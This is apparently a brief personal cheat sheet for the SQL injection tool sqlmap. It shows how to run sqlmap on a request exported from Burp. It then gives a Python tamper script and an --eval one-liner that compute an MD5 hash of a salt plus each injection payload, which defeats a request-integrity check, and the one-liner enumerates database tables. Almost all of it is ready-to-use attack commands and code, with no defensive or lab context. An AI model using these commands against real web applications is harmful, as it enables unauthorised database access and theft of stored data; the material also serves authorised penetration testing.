# sqlmap
#sqlmap #sqli #sqlinjection

1. "Export" request from Burp (copy-paste) to `request`
2. `sqlmap -r request`
3. Profit.

## Tamper scripts
``sqlmap -u "<url>" --tamper=<name-of-temper-file> -p payload --skip-urlencode``

```
#!/usr/bin/env python

import re
import hashlib
from urllib.parse import quote_plus

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    pass

def tamper(payload, **kwargs):
    salt="<salt>"
    str2hash = salt + payload
    result = hashlib.md5(str2hash.encode()).hexdigest()
    
    retVal = quote_plus(payload) + "&h=" + result 
    return retVal
```

## Eval
Same but faster can be achieved with
`sqlmap -r req.req --eval="import hashlib ; h=hashlib.md5(('<salt>'+order).encode('utf-8')).hexdigest()"  --batch --tables --threads=10`